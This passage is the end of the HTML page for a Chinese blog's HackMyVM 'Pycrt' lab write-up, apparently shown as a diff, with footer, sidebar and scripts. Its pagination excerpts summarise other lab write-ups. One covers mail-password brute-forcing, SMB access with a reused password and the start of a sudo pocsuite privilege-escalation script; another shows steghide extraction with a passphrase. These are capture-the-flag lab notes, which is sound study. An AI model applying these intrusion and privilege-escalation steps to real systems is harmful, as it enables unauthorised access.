+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/29/hackmyvm-Pycrt/">http://example.com/2025/05/29/hackmyvm-Pycrt/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/29/box/" title="box"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">box</div></div><div class="info-2"><div class="info-item-1">ysper牌靶机自制靶机 - Ysper_1 爆破邮箱密码   爆破后在里面找到第一个flag  然后利用爆出的密码1q2w3e4r 去进行smb faker访问 下载源码smb: \&gt; recurse ONsmb: \&gt; prompt OFFsmb: \&gt; mget *  源码中找到   拿到shell 数据库中有flag 数据库密码为root在源码config文件中也可找到 sudo -l发现faker权限的pocsuite 提权到faker cat &lt;&lt; &#x27;EOF&#x27; &gt; /tmp/e.pyfrom pocsuite3.api import Output, POCBase, register_pocimport osclass POC(POCBase):    vulID = &quot;faker-001&quot;  # 随便写一个ID    version = &quot;1.0&quot;    author = &quot;chatgpt&quot;    vulDate =...</div></div></div></a><a class="pagination-related" href="/2025/05/29/hackmyvm-reversteg/" title="hackmyvm_reversteg"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hackmyvm_reversteg</div></div><div class="info-2"><div class="info-item-1"> 扫描  80的的源码发现 117db0148dc179a2c2245c5a30e63ab0 根据提示是一张图片 加上jpg即可 图片用随波逐流直接梭  morainelake为steghide密码 提取出的压缩包密码也是morainelake ┌──(root㉿kali)-[/myift/reversbeg]└─# steghide extract -sf 1.jpg --passphrase morainelake wrote extracted data to &quot;secret.zip&quot;.┌──(root㉿kali)-[/myift/reversbeg]└─# ls1.jpg  secret.zip┌──(root㉿kali)-[/myift/reversbeg]└─# unzip secret.zip Archive:  secret.zip   creating: secret/[secret.zip] secret/secret.txt password:  extracting: secret/secret.txt   ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text"></span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-todd/" title="hackmyvm_todd">hackmyvm_todd</a><time datetime="2025-05-29T13:29:17.000Z" title="发表于 2025-05-29 21:29:17">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Matrioshka/" title="hackmyvm_Matrioshka">hackmyvm_Matrioshka</a><time datetime="2025-05-29T13:29:07.000Z" title="发表于 2025-05-29 21:29:07">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-dc04/" title="hackmyvm_dc04">hackmyvm_dc04</a><time datetime="2025-05-29T13:28:50.000Z" title="发表于 2025-05-29 21:28:50">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-always/" title="hackmyvm_always">hackmyvm_always</a><time datetime="2025-05-29T13:28:35.000Z" title="发表于 2025-05-29 21:28:35">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Principle/" title="hackmyvm_Principle">hackmyvm_Principle</a><time datetime="2025-05-29T13:28:25.000Z" title="发表于 2025-05-29 21:28:25">2025-05-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
